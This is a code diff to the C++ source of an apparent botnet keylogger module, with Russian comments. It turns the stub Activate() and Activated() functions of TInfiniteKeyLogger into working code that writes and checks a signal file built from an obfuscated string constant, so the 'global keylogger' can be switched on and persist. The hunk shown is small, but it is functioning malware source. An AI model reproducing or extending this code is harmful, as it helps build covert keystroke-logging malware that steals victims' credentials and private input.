@@ -4,6 +4,7 @@
 
 #include "KeyLogger.h"
 #include "BotCore.h"
+#include "StrConsts.h"
 //---------------------------------------------------------------------------
 
 
@@ -23,12 +24,25 @@ TInfiniteKeyLogger::~TInfiniteKeyLogger()
 //----------------------------------------------------------------------------
 
 //--------------------------------------------
+//  Функция возвращает имя сигнального файла
+//  в котором будет храниться информация о
+//  текущих настройках
+//--------------------------------------------
+string TInfiniteKeyLogger::GetSignalFileName()
+{
+	return Bot->MakeFileName(NULL, GetStr(EStrInfiniteKeyLoggerSignal).t_str());
+}
+
+
+//--------------------------------------------
 //  Activate - Функция активирует глобальный
 //             кейлогер
 //--------------------------------------------
 bool TInfiniteKeyLogger::Activate()
 {
-	return false;
+	string FN = GetSignalFileName();
+	DWORD W = File::WriteBufferA(FN.t_str(), FN.t_str(), 2);
+	return W == 2;
 }
 //----------------------------------------------------------------------------
 
@@ -38,6 +52,7 @@ bool TInfiniteKeyLogger::Activate()
 //--------------------------------------------
 bool TInfiniteKeyLogger::Activated()
 {
-	return false;
+	string FN = GetSignalFileName();
+	return File::IsExists(FN.t_str());
 }
 //----------------------------------------------------------------------------
